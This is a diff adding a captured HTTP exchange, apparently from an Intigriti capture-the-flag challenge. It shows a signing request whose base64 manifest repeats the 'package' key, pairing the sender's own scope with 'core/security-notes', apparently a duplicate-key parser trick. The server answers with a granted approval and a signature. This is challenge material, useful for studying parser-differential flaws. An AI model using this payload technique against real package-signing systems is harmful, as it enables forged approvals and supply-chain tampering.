@@ -1,0 +1,39 @@
+### REQUEST (Caido id 91)
+POST /api/manifests/sign HTTP/1.1
+Host: challenge-0726.intigriti.io
+User-Agent: curl/8.20.0
+Accept: */*
+Cookie: cy_session=JwkUT3jL…REDACTED
+content-type: application/json
+x-csrf-token: c9ada9083ec26246…REDACTED
+Content-Length: 423
+
+{"manifest_b64":"ewogICJwYWNrYWdlIjogewogICAgInNjb3BlIjogImhheDQ0MjY1LWQwOThkMWUxIiwKICAgICJuYW1lIjogImhlbGxvLXdvcmxkIiwKICAgICJ2ZXJzaW9uIjogIjEuMC4wIgogIH0sCiAgInBhY2thZ2UiOiB7CiAgICAic2NvcGUiOiAiY29yZSIsCiAgICAibmFtZSI6ICJzZWN1cml0eS1ub3RlcyIsCiAgICAidmVyc2lvbiI6ICIxLjAuMCIKICB9LAogICJtZXRhZGF0YSI6IHsKICAgICJkZXNjcmlwdGlvbiI6ICJ4IiwKICAgICJ2aXNpYmlsaXR5IjogInByaXZhdGUiCiAgfSwKICAib3BlcmF0aW9uIjogInByZWZsaWdodCIKfQ=="}
+
+### RESPONSE
+HTTP/1.1 201 Created
+Date: Thu, 30 Jul 2026 22:11:05 GMT
+Content-Type: application/json; charset=utf-8
+Content-Length: 320
+Connection: keep-alive
+Cross-Origin-Opener-Policy: same-origin
+Cross-Origin-Resource-Policy: same-origin
+Origin-Agent-Cluster: ?1
+Referrer-Policy: no-referrer
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+X-Content-Type-Options: nosniff
+X-DNS-Prefetch-Control: off
+X-Download-Options: noopen
+X-Frame-Options: SAMEORIGIN
+X-Permitted-Cross-Domain-Policies: none
+X-XSS-Protection: 0
+RateLimit-Policy: 20;w=60
+RateLimit: limit=20, remaining=19, reset=60
+ETag: W/"140-t+45+b5S3narQob4BamQ0J+HKDM"
+X-Content-Type-Options: nosniff
+Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/css2; img-src 'self' data:; connect-src 'self' https://fonts.googleapis.com/css2 https://fonts.gstatic.com; base-uri 'none'; form-action 'self'; frame-ancestors 'self'; font-src 'self' https://fonts.gstatic.com
+Referrer-Policy: no-referrer
+X-Frame-Options: SAMEORIGIN
+Permissions-Policy: geolocation=(), microphone=(), camera=()
+
+{"approval_id":"ef80efc8-6801-4775-9981-aff59cf22c86","manifest_sha256":"e490e65a5d588d8fbab5db1253eb21fdbc5aead825aebd00ecfd5d8b50d9bab3","nonce":"VWZHPYDV2nWLXextoMh-UdOmAle6dMEQaC8WsAkgs28","expires_at":1785449765,"signature":"eHuvMQ5W6oVSW9x+Etqt…"}
